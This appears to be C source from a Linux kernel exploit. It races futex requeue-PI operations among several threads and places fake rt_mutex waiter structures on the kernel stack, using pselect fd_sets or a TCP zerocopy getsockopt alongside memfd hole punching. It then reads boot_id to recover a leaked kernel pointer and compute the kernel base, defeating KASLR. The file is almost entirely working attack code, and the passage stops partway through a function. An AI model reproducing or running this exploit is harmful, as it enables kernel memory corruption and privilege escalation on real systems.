#include "common.h"

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_WAIT_SECONDS 30
#define SLIDE_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
#define SLIDE_TCP_ROUTE_ATTEMPTS 2000
#define SLIDE_TCP_ROUTE_ARM_SEQ 16
#define SLIDE_TCP_POST_GETSOCKOPT_HOLD 20000

#ifndef TCP_ZEROCOPY_RECEIVE
#define TCP_ZEROCOPY_RECEIVE 35
#endif

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_punch_go;
static atomic_int slide_punch_stop;
static atomic_int slide_punch_phase;
static int slide_runtime_shift = PSELECT_WAITER_WORD_SHIFT;

struct slide_punch_state {
  int fd;
  size_t page_size;
};

static unsigned long slide_env_ulong(
    const char *name, unsigned long def, unsigned long max) {
  const char *arg = getenv(name);
  char *end = NULL;
  unsigned long value;

  if (!arg || !*arg) {
    return def;
  }
  errno = 0;
  value = strtoul(arg, &end, 0);
  if (errno || !end || *end || value > max) {
    pr_warning("bad %s value=%s; using %lu\n", name, arg, def);
    return def;
  }
  return value;
}

static unsigned long slide_enter_delay_usec(void) {
  return slide_env_ulong("SLIDE_ENTER_DELAY_USEC",
                         PSELECT_ENTER_DELAY_USEC, 1000000);
}

static unsigned long slide_consume_delay(void) {
  return slide_env_ulong("SLIDE_CONSUME_DELAY", SLIDE_CONSUME_DELAY, 1000000);
}

static unsigned long slide_consume_usec(void) {
  return slide_env_ulong("SLIDE_CONSUME_USEC", SLIDE_CONSUME_USEC, 1000000);
}

static unsigned long slide_consumer_core(void) {
  return slide_env_ulong("SLIDE_CONSUMER_CORE", CONSUMER_CORE, 256);
}

static int slide_consumer_nice(int calls) {
  const char *arg = getenv("SLIDE_CONSUMER_NICE");
  char *end = NULL;
  long value;

  if (!arg || !*arg) {
    return (calls % 19) + 1;
  }
  errno = 0;
  value = strtol(arg, &end, 0);
  if (errno || !end || *end || value < -20 || value > 19) {
    pr_warning("bad SLIDE_CONSUMER_NICE value=%s; using default\n", arg);
    return (calls % 19) + 1;
  }
  return (int)value;
}

static unsigned long slide_requeue_delay_usec(void) {
  return slide_env_ulong("SLIDE_REQUEUE_DELAY_USEC", 0, 3000000);
}

static unsigned long slide_owner_chain_delay_usec(void) {
  return slide_env_ulong("SLIDE_OWNER_CHAIN_DELAY_USEC", 0, 3000000);
}

static unsigned long slide_tcp_post_hold(void) {
  return slide_env_ulong("SLIDE_TCP_POST_GETSOCKOPT_HOLD",
                         SLIDE_TCP_POST_GETSOCKOPT_HOLD, 1000000);
}

static unsigned long slide_tcp_route_attempts(void) {
  return slide_env_ulong("SLIDE_TCP_ROUTE_ATTEMPTS",
                         SLIDE_TCP_ROUTE_ATTEMPTS, 1000000);
}

static unsigned long slide_tcp_route_arm_seq(void) {
  return slide_env_ulong("SLIDE_TCP_ROUTE_ARM_SEQ",
                         SLIDE_TCP_ROUTE_ARM_SEQ, 1000000);
}

static uintptr_t slide_stage0_logger_addr(void) {
  if (env_flag("SLIDE_STAGE0_LOGGER_SLOT2", 1)) {
    return SLIDE_LOGGERS_0_1 + 0x20;
  }
  return SLIDE_LOGGERS_0_1;
}

static int slide_forced_shift(int *shift) {
  const char *arg = getenv("SLIDE_SHIFT");

  if (!arg || !*arg) {
    return 0;
  }
  *shift = (int)slide_env_ulong("SLIDE_SHIFT", PSELECT_WAITER_WORD_SHIFT, 16);
  return 1;
}

static int slide_group_shift(const char *name) {
  const char *arg = getenv(name);

  if (!arg || !*arg) {
    return slide_runtime_shift;
  }
  return (int)slide_env_ulong(name, (unsigned long)slide_runtime_shift, 16);
}

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_runtime_shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name) {
  int global_word = shift + waiter_word;
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  if (env_flag("SLIDE_CATSTACK_WORDS", 0)) {
    struct slide_waiter_word {
      int word;
      uint64_t value;
      const char *name;
    } words[] = {
      {0, (env_flag("SLIDE_CATSTACK_W0_LOGGER", 0) ||
           env_flag("SLIDE_CATSTACK_WONLY_BOOTID", 0)) ?
          slide_stage0_logger_addr() : fake_w0, "w0"},
      {2, env_flag("SLIDE_CATSTACK_WONLY_BOOTID", 0) ?
          SLIDE_RANDOM_BOOT_ID_DATA : 0, "tree_left"},
      {3, FAKE_WAITER_PRIO, "tree_prio"},
      {5, slide_stage0_logger_addr(), "pi_parent"},
      {7, SLIDE_RANDOM_BOOT_ID_DATA, "target"},
      {8, FAKE_WAITER_PRIO, "pi_prio"},
      {10, env_flag("SLIDE_FAKE_TASK", 0) ? fake_task : SLIDE_INIT_TASK, "task"},
      {11, fake_lock, "lock"},
      {12, 3, "wake_state"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct slide_waiter_word *w = &words[i];
      slide_pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, slide_runtime_shift,
          w->value, w->name);
    }
    return;
  }

  int tree_shift = slide_group_shift("SLIDE_TREE_SHIFT");
  int pi_shift = slide_group_shift("SLIDE_PI_SHIFT");
  int tail_shift = slide_group_shift("SLIDE_TAIL_SHIFT");
  struct slide_waiter_word {
    int word;
    int shift;
    uint64_t value;
    const char *name;
  } words[] = {
    {2, tree_shift, SLIDE_LOGGERS_0_1, "tree_pc"},
    {3, tree_shift, 0, "tree_right"},
    {4, tree_shift, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {5, pi_shift, SLIDE_LOGGERS_0_1, "pi_parent"},
    {6, pi_shift, 0, "pi_right"},
    {7, pi_shift, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
    {8, tail_shift,
     env_flag("SLIDE_FAKE_TASK", 0) ? fake_task : SLIDE_INIT_TASK, "task"},
    {9, tail_shift, fake_lock, "lock"},
    {10, tail_shift, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
    {11, tail_shift, 0, "deadline"},
    {12, tail_shift, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->shift, w->value, w->name);
  }
}

static void log_slide_catstack_fdset_words(
    const fd_set *in, const fd_set *out, const fd_set *ex) {
  if (!env_flag("SLIDE_DUMP_CATSTACK_FDSET", 0)) {
    return;
  }

  int words_per_set = slide_pselect_words_per_set();
  int w0_word = slide_pselect_global_word(0);
  int tree_left_word = slide_pselect_global_word(2);
  int tree_prio_word = slide_pselect_global_word(3);
  int pi0_word = slide_pselect_global_word(5);
  int target_word = slide_pselect_global_word(7);
  int pi_prio_word = slide_pselect_global_word(8);
  int task_word = slide_pselect_global_word(10);
  int lock_word = slide_pselect_global_word(11);
  int wake_word = slide_pselect_global_word(12);
  int zero_word = slide_pselect_global_word(13);

  pr_info("slide catstack fdset nfds=%d words=%d shift=%d "
          "w0@%d=%016llx treeleft@%d=%016llx treeprio@%d=%016llx pi0@%d=%016llx "
          "target@%d=%016llx piprio@%d=%016llx task@%d=%016llx "
          "lock@%d=%016llx wake@%d=%016llx zero13@%d=%016llx\n",
          SLIDE_PSELECT_NFDS, words_per_set, slide_runtime_shift,
          w0_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, w0_word),
          tree_left_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, tree_left_word),
          tree_prio_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, tree_prio_word),
          pi0_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, pi0_word),
          target_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, target_word),
          pi_prio_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, pi_prio_word),
          task_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, task_word),
          lock_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, lock_word),
          wake_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, wake_word),
          zero_word,
          (unsigned long long)slide_pselect_get_global_word(
              in, out, ex, words_per_set, zero_word));
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  log_slide_catstack_fdset_words(&in, &out, &ex);
  pr_info("slide pselect setup shift=%d page=%016zx fake_lock=%016zx "
          "fake_w0=%016zx fake_task=%016zx\n",
          slide_runtime_shift, page_base, fake_lock, fake_w0, fake_task);
  pr_info("slide pselect before fd install nfds=%d\n", SLIDE_PSELECT_NFDS);
  open_slide_selected_fds(&in, &out, &ex, high_read);
  pr_info("slide pselect after fd install\n");

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_go, 1);
  pr_info("slide pselect before syscall\n");
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  if (env_flag("SLIDE_POST_PSELECT_WAIT_SCHED_OK", 0)) {
    for (int spin = 0; spin < 10000; spin++) {
      if (atomic_load(&slide_consume_sched_ok) > 0 ||
          atomic_load(&slide_consume_last_sched_ret) != -1) {
        break;
      }
      usleep(100);
    }
  }
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

static int slide_make_tcp_pair(int *client_fd, int *server_fd) {
  *client_fd = -1;
  *server_fd = -1;

  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) {
    return -1;
  }

  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    close(listener);
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    close(listener);
    return -1;
  }

  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (*client_fd < 0) {
    close(listener);
    return -1;
  }
  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    close(*client_fd);
    *client_fd = -1;
    close(listener);
    return -1;
  }

  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  close(listener);
  if (*server_fd < 0) {
    close(*client_fd);
    *client_fd = -1;
    return -1;
  }
  return 0;
}

static void *slide_tcp_punch_thread(void *arg) {
  disable_rseq_for_thread();

  struct slide_punch_state *state = arg;
  while (!atomic_load(&slide_punch_go)) {
    sched_yield();
  }

  while (!atomic_load(&slide_punch_stop)) {
    if (fallocate(state->fd, 0, 0, SLIDE_PUNCH_SHMEM_LEN) != 0) {
      pr_warning("slide tcp punch fallocate fill errno=%d\n", errno);
      continue;
    }
    atomic_store(&slide_punch_phase, 1);
    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  state->page_size,
                  SLIDE_PUNCH_SHMEM_LEN - state->page_size) != 0) {
      pr_warning("slide tcp punch hole errno=%d\n", errno);
    }
    atomic_store(&slide_punch_phase, 0);
  }
  return NULL;
}

void slide_tcp_stack_copy(void) {
  if (!page_base || !fake_lock) {
    pr_error("slide tcp missing kernel page base=%016zx lock=%016zx\n",
             page_base, fake_lock);
    return;
  }

  pr_info("slide tcp enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx\n",
          page_base, fake_lock, fake_w0, fake_task);

  int client_fd = -1;
  int server_fd = -1;
  int punch_fd = -1;
  char *map = MAP_FAILED;
  pthread_t puncher;
  int puncher_started = 0;

  if (slide_make_tcp_pair(&client_fd, &server_fd) != 0) {
    pr_error("slide tcp route setup failed errno=%d\n", errno);
    goto out;
  }
  pr_info("slide tcp pair client=%d server=%d\n", client_fd, server_fd);

  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  punch_fd = (int)syscall(SYS_memfd_create, "slide-tcp-punch", MFD_CLOEXEC);
  if (punch_fd < 0) {
    pr_error("slide tcp memfd_create failed errno=%d\n", errno);
    goto out;
  }
  if (fallocate(punch_fd, 0, 0, SLIDE_PUNCH_SHMEM_LEN) != 0) {
    pr_error("slide tcp fallocate failed errno=%d\n", errno);
    goto out;
  }
  pr_info("slide tcp punch fd=%d page_size=%zu len=%d\n",
          punch_fd, page_size, SLIDE_PUNCH_SHMEM_LEN);
  map = mmap(NULL, SLIDE_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
             MAP_SHARED, punch_fd, 0);
  if (map == MAP_FAILED) {
    pr_error("slide tcp mmap failed errno=%d\n", errno);
    goto out;
  }
  pr_info("slide tcp punch map=%p\n", map);
  for (size_t off = 0; off < SLIDE_PUNCH_SHMEM_LEN; off += page_size) {
    map[off] = 0x55;
  }

  struct slide_punch_state state = {
    .fd = punch_fd,
    .page_size = page_size,
  };
  if (pthread_create(&puncher, NULL, slide_tcp_punch_thread, &state) != 0) {
    pr_error("slide tcp punch thread failed errno=%d\n", errno);
    goto out;
  }
  puncher_started = 1;

  atomic_store(&slide_punch_stop, 0);
  atomic_store(&slide_punch_phase, 0);
  atomic_store(&slide_punch_go, 1);
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));
  unsigned long post_hold = slide_tcp_post_hold();
  unsigned long attempts = slide_tcp_route_attempts();
  unsigned long arm_seq = slide_tcp_route_arm_seq();
  pr_info("slide tcp knobs attempts=%lu arm_seq=%lu post_hold=%lu\n",
          attempts, arm_seq, post_hold);

  for (unsigned long i = 1; i <= attempts; i++) {
    int calls_before = atomic_load(&slide_consume_calls);
    send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
    while (atomic_load(&slide_punch_phase)) {
      sched_yield();
    }
    for (int spin = 0; !atomic_load(&slide_punch_phase) && spin < 10000000;
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
    put32(zc, 0x20, sizeof(sendbuf));
    put64(zc, 0x28, SLIDE_INIT_TASK);
    put64(zc, 0x30, fake_lock);

    if (i >= arm_seq) {
      atomic_store(&slide_consume_go, (int)i);
    }
    socklen_t len = sizeof(zc);
    errno = 0;
    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
                         &len);
    int saved_errno = errno;
    if (i >= arm_seq) {
      for (unsigned long spin = 0; spin < post_hold; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
      atomic_store(&slide_consume_go, 0);
    }

    int calls = atomic_load(&slide_consume_calls);
    if (env_flag("SLIDE_TCP_LOG_EACH", 0) ||
        (i % 100) == 0 || ret != 0 || calls > calls_before) {
      pr_info("slide tcp seq=%lu ret=%d errno=%d len=%u calls=%d "
              "sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
              i, ret, saved_errno, len, calls,
              atomic_load(&slide_consume_sched_ok),
              atomic_load(&slide_consume_last_sched_ret),
              atomic_load(&slide_consume_last_sched_errno));
    }
    if (calls > calls_before) {
      break;
    }
  }

out:
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_stop, 1);
  atomic_store(&slide_punch_stop, 1);
  if (puncher_started) {
    pthread_join(puncher, NULL);
  }
  if (map != MAP_FAILED) {
    munmap(map, SLIDE_PUNCH_SHMEM_LEN);
  }
  if (punch_fd >= 0) {
    close(punch_fd);
  }
  if (server_fd >= 0) {
    close(server_fd);
  }
  if (client_fd >= 0) {
    close(client_fd);
  }
  pr_info("slide tcp side effect calls=%d sched_ok=%d\n",
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok));
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  unsigned long consumer_core = slide_consumer_core();
  unsigned long consume_usec = slide_consume_usec();
  unsigned long consume_delay = slide_consume_delay();
  unsigned long enter_delay = slide_enter_delay_usec();

  pin_to_core(consumer_core);
  pr_info("slide consumer knobs core=%lu consume_usec=%lu "
          "consume_delay=%lu enter_delay=%lu\n",
          consumer_core, consume_usec, consume_delay, enter_delay);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (consume_usec) {
      usleep((useconds_t)consume_usec);
    } else {
      for (unsigned long spin = 0; spin < consume_delay; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep((useconds_t)enter_delay);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    long alive_ret = 0;
    int alive_errno = 0;
    if (!env_flag("SLIDE_QUIET_CONSUMER", 1)) {
      pr_info("slide consumer before tgkill tid=%d calls=%d\n", tid, calls);
      errno = 0;
      alive_ret = syscall(SYS_tgkill, getpid(), tid, 0);
      alive_errno = errno;
      pr_info("slide consumer before sched tid=%d alive_ret=%ld "
              "alive_errno=%d\n",
              tid, alive_ret, alive_errno);
    }
    errno = 0;
    int nice_value = slide_consumer_nice(calls);
    long ret = sched_setattr_tid(tid, nice_value);
    int saved_errno = errno;
    pr_info("slide consumer sched tid=%d nice=%d alive_ret=%ld "
            "alive_errno=%d sched_ret=%ld sched_errno=%d\n",
            tid, nice_value, alive_ret, alive_errno, ret, saved_errno);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                          &slide_f_pi_target, 0);
  int wait_errno = errno;
  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
    pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
  }
  errno = 0;
  long unlock_ret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL,
                             NULL, 0);
  int unlock_errno = errno;
  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
    pr_info("slide waiter unlock_chain ret=%ld errno=%d\n", unlock_ret,
            unlock_errno);
  }

  if (env_flag("SLIDE_TCP_ROUTE", 1)) {
    slide_tcp_stack_copy();
  } else {
    slide_pselect_stack_copy();
  }
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  unsigned long owner_delay = slide_owner_chain_delay_usec();
  if (owner_delay) {
    usleep((useconds_t)owner_delay);
  }
  errno = 0;
  long chain_ret = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int chain_errno = errno;
  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
    pr_info("slide owner lock_chain ret=%ld errno=%d delay_usec=%lu\n",
            chain_ret, chain_errno, owner_delay);
  }

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  unsigned long requeue_delay = slide_requeue_delay_usec();
  if (requeue_delay) {
    usleep((useconds_t)requeue_delay);
  }
  errno = 0;
  long requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                              &slide_f_pi_target, 0);
  int requeue_errno = errno;
  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
    pr_info("slide cmp_requeue_pi ret=%ld errno=%d delay_usec=%lu\n",
            requeue_ret, requeue_errno, requeue_delay);
  }

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  static const int shift_candidates[] = {1};
  int route_idx = 0;
  int forced_shift = 0;
  int use_forced_shift = slide_forced_shift(&forced_shift);

  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    int shift_count =
        (int)(sizeof(shift_candidates) / sizeof(shift_candidates[0]));
    if (use_forced_shift) {
      slide_runtime_shift = forced_shift;
    } else {
      slide_runtime_shift = shift_candidates[route_idx++ % shift_count];
    }
    pr_info("slide attempt %d uses pselect shift=%d\n",
            attempt, slide_runtime_shift);

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
